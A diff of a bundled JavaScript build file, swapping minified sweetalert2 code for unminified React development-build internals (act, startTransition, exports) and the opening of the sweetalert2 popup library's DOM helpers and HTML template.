+              Object.defineProperty(validatedFactory, "type", {
+                enumerable: false,
+                get: function() {
+                  warn("Factory.type is deprecated. Access the class directly before passing it to createFactory.");
+                  Object.defineProperty(this, "type", {
+                    value: type
+                  });
+                  return type;
+                }
+              });
+            }
+            return validatedFactory;
+          }
+          function cloneElementWithValidation(element, props, children) {
+            var newElement = cloneElement.apply(this, arguments);
+            for (var i = 2; i < arguments.length; i++) {
+              validateChildKeys(arguments[i], newElement.type);
+            }
+            validatePropTypes(newElement);
+            return newElement;
+          }
+          function startTransition(scope, options) {
+            var prevTransition = ReactCurrentBatchConfig.transition;
+            ReactCurrentBatchConfig.transition = {};
+            var currentTransition = ReactCurrentBatchConfig.transition;
+            {
+              ReactCurrentBatchConfig.transition._updatedFibers = /* @__PURE__ */ new Set();
+            }
+            try {
+              scope();
+            } finally {
+              ReactCurrentBatchConfig.transition = prevTransition;
+              {
+                if (prevTransition === null && currentTransition._updatedFibers) {
+                  var updatedFibersCount = currentTransition._updatedFibers.size;
+                  if (updatedFibersCount > 10) {
+                    warn("Detected a large number of updates inside startTransition. If this is due to a subscription please re-write it to use React provided hooks. Otherwise concurrent mode guarantees are off the table.");
+                  }
+                  currentTransition._updatedFibers.clear();
+                }
+              }
+            }
+          }
+          var didWarnAboutMessageChannel = false;
+          var enqueueTaskImpl = null;
+          function enqueueTask(task) {
+            if (enqueueTaskImpl === null) {
+              try {
+                var requireString = ("require" + Math.random()).slice(0, 7);
+                var nodeRequire = module && module[requireString];
+                enqueueTaskImpl = nodeRequire.call(module, "timers").setImmediate;
+              } catch (_err) {
+                enqueueTaskImpl = function(callback) {
+                  {
+                    if (didWarnAboutMessageChannel === false) {
+                      didWarnAboutMessageChannel = true;
+                      if (typeof MessageChannel === "undefined") {
+                        error("This browser does not have a MessageChannel implementation, so enqueuing tasks via await act(async () => ...) will fail. Please file an issue at https://github.com/facebook/react/issues if you encounter this warning.");
+                      }
+                    }
+                  }
+                  var channel = new MessageChannel();
+                  channel.port1.onmessage = callback;
+                  channel.port2.postMessage(void 0);
+                };
+              }
+            }
+            return enqueueTaskImpl(task);
+          }
+          var actScopeDepth = 0;
+          var didWarnNoAwaitAct = false;
+          function act(callback) {
+            {
+              var prevActScopeDepth = actScopeDepth;
+              actScopeDepth++;
+              if (ReactCurrentActQueue.current === null) {
+                ReactCurrentActQueue.current = [];
+              }
+              var prevIsBatchingLegacy = ReactCurrentActQueue.isBatchingLegacy;
+              var result;
+              try {
+                ReactCurrentActQueue.isBatchingLegacy = true;
+                result = callback();
+                if (!prevIsBatchingLegacy && ReactCurrentActQueue.didScheduleLegacyUpdate) {
+                  var queue = ReactCurrentActQueue.current;
+                  if (queue !== null) {
+                    ReactCurrentActQueue.didScheduleLegacyUpdate = false;
+                    flushActQueue(queue);
+                  }
+                }
+              } catch (error2) {
+                popActScope(prevActScopeDepth);
+                throw error2;
+              } finally {
+                ReactCurrentActQueue.isBatchingLegacy = prevIsBatchingLegacy;
+              }
+              if (result !== null && typeof result === "object" && typeof result.then === "function") {
+                var thenableResult = result;
+                var wasAwaited = false;
+                var thenable = {
+                  then: function(resolve, reject) {
+                    wasAwaited = true;
+                    thenableResult.then(function(returnValue2) {
+                      popActScope(prevActScopeDepth);
+                      if (actScopeDepth === 0) {
+                        recursivelyFlushAsyncActWork(returnValue2, resolve, reject);
+                      } else {
+                        resolve(returnValue2);
+                      }
+                    }, function(error2) {
+                      popActScope(prevActScopeDepth);
+                      reject(error2);
+                    });
+                  }
+                };
+                {
+                  if (!didWarnNoAwaitAct && typeof Promise !== "undefined") {
+                    Promise.resolve().then(function() {
+                    }).then(function() {
+                      if (!wasAwaited) {
+                        didWarnNoAwaitAct = true;
+                        error("You called act(async () => ...) without await. This could lead to unexpected testing behaviour, interleaving multiple act calls and mixing their scopes. You should - await act(async () => ...);");
+                      }
+                    });
+                  }
+                }
+                return thenable;
+              } else {
+                var returnValue = result;
+                popActScope(prevActScopeDepth);
+                if (actScopeDepth === 0) {
+                  var _queue = ReactCurrentActQueue.current;
+                  if (_queue !== null) {
+                    flushActQueue(_queue);
+                    ReactCurrentActQueue.current = null;
+                  }
+                  var _thenable = {
+                    then: function(resolve, reject) {
+                      if (ReactCurrentActQueue.current === null) {
+                        ReactCurrentActQueue.current = [];
+                        recursivelyFlushAsyncActWork(returnValue, resolve, reject);
+                      } else {
+                        resolve(returnValue);
+                      }
+                    }
+                  };
+                  return _thenable;
+                } else {
+                  var _thenable2 = {
+                    then: function(resolve, reject) {
+                      resolve(returnValue);
+                    }
+                  };
+                  return _thenable2;
+                }
+              }
+            }
+          }
+          function popActScope(prevActScopeDepth) {
+            {
+              if (prevActScopeDepth !== actScopeDepth - 1) {
+                error("You seem to have overlapping act() calls, this is not supported. Be sure to await previous act() calls before making a new one. ");
+              }
+              actScopeDepth = prevActScopeDepth;
+            }
+          }
+          function recursivelyFlushAsyncActWork(returnValue, resolve, reject) {
+            {
+              var queue = ReactCurrentActQueue.current;
+              if (queue !== null) {
+                try {
+                  flushActQueue(queue);
+                  enqueueTask(function() {
+                    if (queue.length === 0) {
+                      ReactCurrentActQueue.current = null;
+                      resolve(returnValue);
+                    } else {
+                      recursivelyFlushAsyncActWork(returnValue, resolve, reject);
+                    }
+                  });
+                } catch (error2) {
+                  reject(error2);
+                }
+              } else {
+                resolve(returnValue);
+              }
+            }
+          }
+          var isFlushing = false;
+          function flushActQueue(queue) {
+            {
+              if (!isFlushing) {
+                isFlushing = true;
+                var i = 0;
+                try {
+                  for (; i < queue.length; i++) {
+                    var callback = queue[i];
+                    do {
+                      callback = callback(true);
+                    } while (callback !== null);
+                  }
+                  queue.length = 0;
+                } catch (error2) {
+                  queue = queue.slice(i + 1);
+                  throw error2;
+                } finally {
+                  isFlushing = false;
+                }
+              }
+            }
+          }
+          var createElement$1 = createElementWithValidation;
+          var cloneElement$1 = cloneElementWithValidation;
+          var createFactory = createFactoryWithValidation;
+          var Children = {
+            map: mapChildren,
+            forEach: forEachChildren,
+            count: countChildren,
+            toArray,
+            only: onlyChild
+          };
+          exports.Children = Children;
+          exports.Component = Component;
+          exports.Fragment = REACT_FRAGMENT_TYPE;
+          exports.Profiler = REACT_PROFILER_TYPE;
+          exports.PureComponent = PureComponent;
+          exports.StrictMode = REACT_STRICT_MODE_TYPE;
+          exports.Suspense = REACT_SUSPENSE_TYPE;
+          exports.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = ReactSharedInternals;
+          exports.cloneElement = cloneElement$1;
+          exports.createContext = createContext;
+          exports.createElement = createElement$1;
+          exports.createFactory = createFactory;
+          exports.createRef = createRef;
+          exports.forwardRef = forwardRef;
+          exports.isValidElement = isValidElement;
+          exports.lazy = lazy;
+          exports.memo = memo;
+          exports.startTransition = startTransition;
+          exports.unstable_act = act;
+          exports.useCallback = useCallback;
+          exports.useContext = useContext;
+          exports.useDebugValue = useDebugValue;
+          exports.useDeferredValue = useDeferredValue;
+          exports.useEffect = useEffect;
+          exports.useId = useId;
+          exports.useImperativeHandle = useImperativeHandle;
+          exports.useInsertionEffect = useInsertionEffect;
+          exports.useLayoutEffect = useLayoutEffect;
+          exports.useMemo = useMemo;
+          exports.useReducer = useReducer;
+          exports.useRef = useRef;
+          exports.useState = useState;
+          exports.useSyncExternalStore = useSyncExternalStore;
+          exports.useTransition = useTransition;
+          exports.version = ReactVersion;
+          if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== "undefined" && typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop === "function") {
+            __REACT_DEVTOOLS_GLOBAL_HOOK__.registerInternalModuleStop(new Error());
+          }
+        })();
+      }
+    }
+  });
+
+  // node_modules/react/index.js
+  var require_react = __commonJS({
+    "node_modules/react/index.js"(exports, module) {
+      "use strict";
+      if (false) {
+        module.exports = null;
+      } else {
+        module.exports = require_react_development();
+      }
+    }
+  });
+
+  // node_modules/sweetalert2/dist/sweetalert2.all.js
+  var require_sweetalert2_all = __commonJS({
+    "node_modules/sweetalert2/dist/sweetalert2.all.js"(exports, module) {
+      (function(global, factory) {
+        typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory() : typeof define === "function" && define.amd ? define(factory) : (global = typeof globalThis !== "undefined" ? globalThis : global || self, global.Sweetalert2 = factory());
+      })(exports, function() {
+        "use strict";
+        var privateProps = {
+          awaitingPromise: /* @__PURE__ */ new WeakMap(),
+          promise: /* @__PURE__ */ new WeakMap(),
+          innerParams: /* @__PURE__ */ new WeakMap(),
+          domCache: /* @__PURE__ */ new WeakMap()
+        };
+        const swalPrefix = "swal2-";
+        const prefix = (items) => {
+          const result = {};
+          for (const i in items) {
+            result[items[i]] = swalPrefix + items[i];
+          }
+          return result;
+        };
+        const swalClasses = prefix(["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"]);
+        const iconTypes = prefix(["success", "warning", "info", "question", "error"]);
+        const consolePrefix = "SweetAlert2:";
+        const uniqueArray = (arr) => {
+          const result = [];
+          for (let i = 0; i < arr.length; i++) {
+            if (result.indexOf(arr[i]) === -1) {
+              result.push(arr[i]);
+            }
+          }
+          return result;
+        };
+        const capitalizeFirstLetter = (str) => str.charAt(0).toUpperCase() + str.slice(1);
+        const warn = (message) => {
+          console.warn(`${consolePrefix} ${typeof message === "object" ? message.join(" ") : message}`);
+        };
+        const error = (message) => {
+          console.error(`${consolePrefix} ${message}`);
+        };
+        const previousWarnOnceMessages = [];
+        const warnOnce = (message) => {
+          if (!previousWarnOnceMessages.includes(message)) {
+            previousWarnOnceMessages.push(message);
+            warn(message);
+          }
+        };
+        const warnAboutDeprecation = (deprecatedParam, useInstead) => {
+          warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release. Please use "${useInstead}" instead.`);
+        };
+        const callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
+        const hasToPromiseFn = (arg) => arg && typeof arg.toPromise === "function";
+        const asPromise = (arg) => hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
+        const isPromise = (arg) => arg && Promise.resolve(arg) === arg;
+        const getContainer = () => document.body.querySelector(`.${swalClasses.container}`);
+        const elementBySelector = (selectorString) => {
+          const container = getContainer();
+          return container ? container.querySelector(selectorString) : null;
+        };
+        const elementByClass = (className) => {
+          return elementBySelector(`.${className}`);
+        };
+        const getPopup = () => elementByClass(swalClasses.popup);
+        const getIcon = () => elementByClass(swalClasses.icon);
+        const getIconContent = () => elementByClass(swalClasses["icon-content"]);
+        const getTitle = () => elementByClass(swalClasses.title);
+        const getHtmlContainer = () => elementByClass(swalClasses["html-container"]);
+        const getImage = () => elementByClass(swalClasses.image);
+        const getProgressSteps = () => elementByClass(swalClasses["progress-steps"]);
+        const getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
+        const getConfirmButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.confirm}`);
+        const getDenyButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.deny}`);
+        const getInputLabel = () => elementByClass(swalClasses["input-label"]);
+        const getLoader = () => elementBySelector(`.${swalClasses.loader}`);
+        const getCancelButton = () => elementBySelector(`.${swalClasses.actions} .${swalClasses.cancel}`);
+        const getActions = () => elementByClass(swalClasses.actions);
+        const getFooter = () => elementByClass(swalClasses.footer);
+        const getTimerProgressBar = () => elementByClass(swalClasses["timer-progress-bar"]);
+        const getCloseButton = () => elementByClass(swalClasses.close);
+        const focusable = `
   a[href],
   area[href],
   input:not([disabled]),
@@ -13,53 +2031,2993 @@
   audio[controls],
   video[controls],
   summary
-`,w2=()=>{let t=Array.from(m().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort((r,c)=>{let i=parseInt(r.getAttribute("tabindex")),g=parseInt(c.getAttribute("tabindex"));return i>g?1:i<g?-1:0}),a=Array.from(m().querySelectorAll(H0)).filter(r=>r.getAttribute("tabindex")!=="-1");return u(t.concat(a)).filter(r=>W(r))},L2=()=>Z(document.body,n.shown)&&!Z(document.body,n["toast-shown"])&&!Z(document.body,n["no-backdrop"]),a2=()=>m()&&Z(m(),n.toast),f0=()=>m().hasAttribute("data-loading"),H1={previousBodyPadding:null},N=(t,a)=>{if(t.textContent="",a){let c=new DOMParser().parseFromString(a,"text/html");Array.from(c.querySelector("head").childNodes).forEach(i=>{t.appendChild(i)}),Array.from(c.querySelector("body").childNodes).forEach(i=>{i instanceof HTMLVideoElement||i instanceof HTMLAudioElement?t.appendChild(i.cloneNode(!0)):t.appendChild(i)})}},Z=(t,a)=>{if(!a)return!1;let r=a.split(/\s+/);for(let c=0;c<r.length;c++)if(!t.classList.contains(r[c]))return!1;return!0},V0=(t,a)=>{Array.from(t.classList).forEach(r=>{!Object.values(n).includes(r)&&!Object.values(o).includes(r)&&!Object.values(a.showClass).includes(r)&&t.classList.remove(r)})},$=(t,a,r)=>{if(V0(t,a),a.customClass&&a.customClass[r]){if(typeof a.customClass[r]!="string"&&!a.customClass[r].forEach){d(`Invalid type of customClass.${r}! Expected string or iterable object, got "${typeof a.customClass[r]}"`);return}x(t,a.customClass[r])}},B2=(t,a)=>{if(!a)return null;switch(a){case"select":case"textarea":case"file":return t.querySelector(`.${n.popup} > .${n[a]}`);case"checkbox":return t.querySelector(`.${n.popup} > .${n.checkbox} input`);case"radio":return t.querySelector(`.${n.popup} > .${n.radio} input:checked`)||t.querySelector(`.${n.popup} > .${n.radio} input:first-child`);case"range":return t.querySelector(`.${n.popup} > .${n.range} input`);default:return t.querySelector(`.${n.popup} > .${n.input}`)}},et=t=>{if(t.focus(),t.type!=="file"){let a=t.value;t.value="",t.value=a}},ct=(t,a,r)=>{!t||!a||(typeof a=="string"&&(a=a.split(/\s+/).filter(Boolean)),a.forEach(c=>{Array.isArray(t)?t.forEach(i=>{r?i.classList.add(c):i.classList.remove(c)}):r?t.classList.add(c):t.classList.remove(c)}))},x=(t,a)=>{ct(t,a,!0)},_=(t,a)=>{ct(t,a,!1)},r1=(t,a)=>{let r=Array.from(t.children);for(let c=0;c<r.length;c++){let i=r[c];if(i instanceof HTMLElement&&Z(i,a))return i}},f1=(t,a,r)=>{r===`${parseInt(r)}`&&(r=parseInt(r)),r||parseInt(r)===0?t.style[a]=typeof r=="number"?`${r}px`:r:t.style.removeProperty(a)},k=function(t){let a=arguments.length>1&&arguments[1]!==void 0?arguments[1]:"flex";t.style.display=a},T=t=>{t.style.display="none"},nt=(t,a,r,c)=>{let i=t.querySelector(a);i&&(i.style[r]=c)},h2=function(t,a){let r=arguments.length>2&&arguments[2]!==void 0?arguments[2]:"flex";a?k(t,r):T(t)},W=t=>!!(t&&(t.offsetWidth||t.offsetHeight||t.getClientRects().length)),m0=()=>!W(B())&&!W(P())&&!W(i1()),vt=t=>t.scrollHeight>t.clientHeight,lt=t=>{let a=window.getComputedStyle(t),r=parseFloat(a.getPropertyValue("animation-duration")||"0"),c=parseFloat(a.getPropertyValue("transition-duration")||"0");return r>0||c>0},C2=function(t){let a=arguments.length>1&&arguments[1]!==void 0?arguments[1]:!1,r=t2();W(r)&&(a&&(r.style.transition="none",r.style.width="100%"),setTimeout(()=>{r.style.transition=`width ${t/1e3}s linear`,r.style.width="0%"},10))},x0=()=>{let t=t2(),a=parseInt(window.getComputedStyle(t).width);t.style.removeProperty("transition"),t.style.width="100%";let r=parseInt(window.getComputedStyle(t).width),c=a/r*100;t.style.removeProperty("transition"),t.style.width=`${c}%`},w0=100,H={},L0=()=>{H.previousActiveElement instanceof HTMLElement?(H.previousActiveElement.focus(),H.previousActiveElement=null):document.body&&document.body.focus()},B0=t=>new Promise(a=>{if(!t)return a();let r=window.scrollX,c=window.scrollY;H.restoreFocusTimeout=setTimeout(()=>{L0(),a()},w0),window.scrollTo(r,c)}),it=()=>typeof window>"u"||typeof document>"u",C0=`
- <div aria-labelledby="${n.title}" aria-describedby="${n["html-container"]}" class="${n.popup}" tabindex="-1">
-   <button type="button" class="${n.close}"></button>
-   <ul class="${n["progress-steps"]}"></ul>
-   <div class="${n.icon}"></div>
-   <img class="${n.image}" />
-   <h2 class="${n.title}" id="${n.title}"></h2>
-   <div class="${n["html-container"]}" id="${n["html-container"]}"></div>
-   <input class="${n.input}" />
-   <input type="file" class="${n.file}" />
-   <div class="${n.range}">
+`;
+        const getFocusableElements = () => {
+          const focusableElementsWithTabindex = Array.from(getPopup().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort((a, b) => {
+            const tabindexA = parseInt(a.getAttribute("tabindex"));
+            const tabindexB = parseInt(b.getAttribute("tabindex"));
+            if (tabindexA > tabindexB) {
+              return 1;
+            } else if (tabindexA < tabindexB) {
+              return -1;
+            }
+            return 0;
+          });
+          const otherFocusableElements = Array.from(getPopup().querySelectorAll(focusable)).filter((el) => el.getAttribute("tabindex") !== "-1");
+          return uniqueArray(focusableElementsWithTabindex.concat(otherFocusableElements)).filter((el) => isVisible$1(el));
+        };
+        const isModal = () => {
+          return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
+        };
+        const isToast = () => {
+          return getPopup() && hasClass(getPopup(), swalClasses.toast);
+        };
+        const isLoading = () => {
+          return getPopup().hasAttribute("data-loading");
+        };
+        const states2 = {
+          previousBodyPadding: null
+        };
+        const setInnerHtml = (elem, html) => {
+          elem.textContent = "";
+          if (html) {
+            const parser = new DOMParser();
+            const parsed = parser.parseFromString(html, `text/html`);
+            Array.from(parsed.querySelector("head").childNodes).forEach((child) => {
+              elem.appendChild(child);
+            });
+            Array.from(parsed.querySelector("body").childNodes).forEach((child) => {
+              if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
+                elem.appendChild(child.cloneNode(true));
+              } else {
+                elem.appendChild(child);
+              }
+            });
+          }
+        };
+        const hasClass = (elem, className) => {
+          if (!className) {
+            return false;
+          }
+          const classList = className.split(/\s+/);
+          for (let i = 0; i < classList.length; i++) {
+            if (!elem.classList.contains(classList[i])) {
+              return false;
+            }
+          }
+          return true;
+        };
+        const removeCustomClasses = (elem, params) => {
+          Array.from(elem.classList).forEach((className) => {
+            if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass).includes(className)) {
+              elem.classList.remove(className);
+            }
+          });
+        };
+        const applyCustomClass = (elem, params, className) => {
+          removeCustomClasses(elem, params);
+          if (params.customClass && params.customClass[className]) {
+            if (typeof params.customClass[className] !== "string" && !params.customClass[className].forEach) {
+              warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof params.customClass[className]}"`);
+              return;
+            }
+            addClass(elem, params.customClass[className]);
+          }
+        };
+        const getInput$1 = (popup, inputClass) => {
+          if (!inputClass) {
+            return null;
+          }
+          switch (inputClass) {
+            case "select":
+            case "textarea":
+            case "file":
+              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses[inputClass]}`);
+            case "checkbox":
+              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.checkbox} input`);
+            case "radio":
+              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:checked`) || popup.querySelector(`.${swalClasses.popup} > .${swalClasses.radio} input:first-child`);
+            case "range":
+              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.range} input`);
+            default:
+              return popup.querySelector(`.${swalClasses.popup} > .${swalClasses.input}`);
+          }
+        };
+        const focusInput = (input) => {
+          input.focus();
+          if (input.type !== "file") {
+            const val = input.value;
+            input.value = "";
+            input.value = val;
+          }
+        };
+        const toggleClass = (target, classList, condition) => {
+          if (!target || !classList) {
+            return;
+          }
+          if (typeof classList === "string") {
+            classList = classList.split(/\s+/).filter(Boolean);
+          }
+          classList.forEach((className) => {
+            if (Array.isArray(target)) {
+              target.forEach((elem) => {
+                condition ? elem.classList.add(className) : elem.classList.remove(className);
+              });
+            } else {
+              condition ? target.classList.add(className) : target.classList.remove(className);
+            }
+          });
+        };
+        const addClass = (target, classList) => {
+          toggleClass(target, classList, true);
+        };
+        const removeClass = (target, classList) => {
+          toggleClass(target, classList, false);
+        };
+        const getDirectChildByClass = (elem, className) => {
+          const children = Array.from(elem.children);
+          for (let i = 0; i < children.length; i++) {
+            const child = children[i];
+            if (child instanceof HTMLElement && hasClass(child, className)) {
+              return child;
+            }
+          }
+        };
+        const applyNumericalStyle = (elem, property, value) => {
+          if (value === `${parseInt(value)}`) {
+            value = parseInt(value);
+          }
+          if (value || parseInt(value) === 0) {
+            elem.style[property] = typeof value === "number" ? `${value}px` : value;
+          } else {
+            elem.style.removeProperty(property);
+          }
+        };
+        const show = function(elem) {
+          let display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
+          elem.style.display = display;
+        };
+        const hide = (elem) => {
+          elem.style.display = "none";
+        };
+        const setStyle = (parent, selector, property, value) => {
+          const el = parent.querySelector(selector);
+          if (el) {
+            el.style[property] = value;
+          }
+        };
+        const toggle = function(elem, condition) {
+          let display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
+          condition ? show(elem, display) : hide(elem);
+        };
+        const isVisible$1 = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
+        const allButtonsAreHidden = () => !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
+        const isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
+        const hasCssAnimation = (elem) => {
+          const style = window.getComputedStyle(elem);
+          const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
+          const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
+          return animDuration > 0 || transDuration > 0;
+        };
+        const animateTimerProgressBar = function(timer) {
+          let reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
+          const timerProgressBar = getTimerProgressBar();
+          if (isVisible$1(timerProgressBar)) {
+            if (reset) {
+              timerProgressBar.style.transition = "none";
+              timerProgressBar.style.width = "100%";
+            }
+            setTimeout(() => {
+              timerProgressBar.style.transition = `width ${timer / 1e3}s linear`;
+              timerProgressBar.style.width = "0%";
+            }, 10);
+          }
+        };
+        const stopTimerProgressBar = () => {
+          const timerProgressBar = getTimerProgressBar();
+          const timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
+          timerProgressBar.style.removeProperty("transition");
+          timerProgressBar.style.width = "100%";
+          const timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
+          const timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
+          timerProgressBar.style.removeProperty("transition");
+          timerProgressBar.style.width = `${timerProgressBarPercent}%`;
+        };
+        const RESTORE_FOCUS_TIMEOUT = 100;
+        const globalState = {};
+        const focusPreviousActiveElement = () => {
+          if (globalState.previousActiveElement instanceof HTMLElement) {
+            globalState.previousActiveElement.focus();
+            globalState.previousActiveElement = null;
+          } else if (document.body) {
+            document.body.focus();
+          }
+        };
+        const restoreActiveElement = (returnFocus) => {
+          return new Promise((resolve) => {
+            if (!returnFocus) {
+              return resolve();
+            }
+            const x = window.scrollX;
+            const y = window.scrollY;
+            globalState.restoreFocusTimeout = setTimeout(() => {
+              focusPreviousActiveElement();
+              resolve();
+            }, RESTORE_FOCUS_TIMEOUT);
+            window.scrollTo(x, y);
+          });
+        };
+        const isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";
+        const sweetHTML = `
+ <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses["html-container"]}" class="${swalClasses.popup}" tabindex="-1">
+   <button type="button" class="${swalClasses.close}"></button>
+   <ul class="${swalClasses["progress-steps"]}"></ul>
+   <div class="${swalClasses.icon}"></div>
+   <img class="${swalClasses.image}" />
+   <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
+   <div class="${swalClasses["html-container"]}" id="${swalClasses["html-container"]}"></div>
+   <input class="${swalClasses.input}" />
+   <input type="file" class="${swalClasses.file}" />
+   <div class="${swalClasses.range}">
      <input type="range" />
      <output></output>
    </div>
-   <select class="${n.select}"></select>
-   <div class="${n.radio}"></div>
-   <label for="${n.checkbox}" class="${n.checkbox}">
+   <select class="${swalClasses.select}"></select>
+   <div class="${swalClasses.radio}"></div>
+   <label for="${swalClasses.checkbox}" class="${swalClasses.checkbox}">
      <input type="checkbox" />
-     <span class="${n.label}"></span>
+     <span class="${swalClasses.label}"></span>
    </label>
-   <textarea class="${n.textarea}"></textarea>
-   <div class="${n["validation-message"]}" id="${n["validation-message"]}"></div>
-   <div class="${n.actions}">
-     <div class="${n.loader}"></div>
-     <button type="button" class="${n.confirm}"></button>
-     <button type="button" class="${n.deny}"></button>
-     <button type="button" class="${n.cancel}"></button>
+   <textarea class="${swalClasses.textarea}"></textarea>
+   <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
+   <div class="${swalClasses.actions}">
+     <div class="${swalClasses.loader}"></div>
+     <button type="button" class="${swalClasses.confirm}"></button>
+     <button type="button" class="${swalClasses.deny}"></button>
+     <button type="button" class="${swalClasses.cancel}"></button>
    </div>
-   <div class="${n.footer}"></div>
-   <div class="${n["timer-progress-bar-container"]}">
-     <div class="${n["timer-progress-bar"]}"></div>
+   <div class="${swalClasses.footer}"></div>
+   <div class="${swalClasses["timer-progress-bar-container"]}">
+     <div class="${swalClasses["timer-progress-bar"]}"></div>
    </div>
  </div>
-`.replace(/(^|\n)\s*/g,""),O0=()=>{let t=A();return t?(t.remove(),_([document.documentElement,document.body],[n["no-backdrop"],n["toast-shown"],n["has-column"]]),!0):!1},o1=()=>{H.currentInstance.resetValidationMessage()},S0=()=>{let t=m(),a=r1(t,n.input),r=r1(t,n.file),c=t.querySelector(`.${n.range} input`),i=t.querySelector(`.${n.range} output`),g=r1(t,n.select),S=t.querySelector(`.${n.checkbox} input`),Q=r1(t,n.textarea);a.oninput=o1,r.onchange=o1,g.onchange=o1,S.onchange=o1,Q.oninput=o1,c.oninput=()=>{o1(),i.value=c.value},c.onchange=()=>{o1(),i.value=c.value}},A0=t=>typeof t=="string"?document.querySelector(t):t,y0=t=>{let a=m();a.setAttribute("role",t.toast?"alert":"dialog"),a.setAttribute("aria-live",t.toast?"polite":"assertive"),t.toast||a.setAttribute("aria-modal","true")},b0=t=>{window.getComputedStyle(t).direction==="rtl"&&x(A(),n.rtl)},k0=t=>{let a=O0();if(it()){M("SweetAlert2 requires document to initialize");return}let r=document.createElement("div");r.className=n.container,a&&x(r,n["no-transition"]),N(r,C0);let c=A0(t.target);c.appendChild(r),y0(t),b0(c),S0()},O2=(t,a)=>{t instanceof HTMLElement?a.appendChild(t):typeof t=="object"?P0(t,a):t&&N(a,t)},P0=(t,a)=>{t.jquery?T0(a,t):N(a,t.toString())},T0=(t,a)=>{if(t.textContent="",0 in a)for(let r=0;r in a;r++)t.appendChild(a[r].cloneNode(!0));else t.appendChild(a.cloneNode(!0))},R1=(()=>{if(it())return!1;let t=document.createElement("div"),a={WebkitAnimation:"webkitAnimationEnd",animation:"animationend"};for(let r in a)if(Object.prototype.hasOwnProperty.call(a,r)&&typeof t.style[r]<"u")return a[r];return!1})(),F0=()=>{let t=document.createElement("div");t.className=n["scrollbar-measure"],document.body.appendChild(t);let a=t.getBoundingClientRect().width-t.clientWidth;return document.body.removeChild(t),a},E0=(t,a)=>{let r=E1(),c=u1();!a.showConfirmButton&&!a.showDenyButton&&!a.showCancelButton?T(r):k(r),$(r,a,"actions"),R0(r,c,a),N(c,a.loaderHtml),$(c,a,"loader")};function R0(t,a,r){let c=B(),i=P(),g=i1();S2(c,"confirm",r),S2(i,"deny",r),S2(g,"cancel",r),D0(c,i,g,r),r.reverseButtons&&(r.toast?(t.insertBefore(g,c),t.insertBefore(i,c)):(t.insertBefore(g,a),t.insertBefore(i,a),t.insertBefore(c,a)))}function D0(t,a,r,c){if(!c.buttonsStyling){_([t,a,r],n.styled);return}x([t,a,r],n.styled),c.confirmButtonColor&&(t.style.backgroundColor=c.confirmButtonColor,x(t,n["default-outline"])),c.denyButtonColor&&(a.style.backgroundColor=c.denyButtonColor,x(a,n["default-outline"])),c.cancelButtonColor&&(r.style.backgroundColor=c.cancelButtonColor,x(r,n["default-outline"]))}function S2(t,a,r){h2(t,r[`show${z(a)}Button`],"inline-block"),N(t,r[`${a}ButtonText`]),t.setAttribute("aria-label",r[`${a}ButtonAriaLabel`]),t.className=n[a],$(t,r,`${a}Button`),x(t,r[`${a}ButtonClass`])}let I0=(t,a)=>{let r=x2();N(r,a.closeButtonHtml),$(r,a,"closeButton"),h2(r,a.showCloseButton),r.setAttribute("aria-label",a.closeButtonAriaLabel)},N0=(t,a)=>{let r=A();r&&(W0(r,a.backdrop),U0(r,a.position),$0(r,a.grow),$(r,a,"container"))};function W0(t,a){typeof a=="string"?t.style.background=a:a||x([document.documentElement,document.body],n["no-backdrop"])}function U0(t,a){a in n?x(t,n[a]):(d('The "position" parameter is not valid, defaulting to "center"'),x(t,n.center))}function $0(t,a){if(a&&typeof a=="string"){let r=`grow-${a}`;r in n&&x(t,n[r])}}let 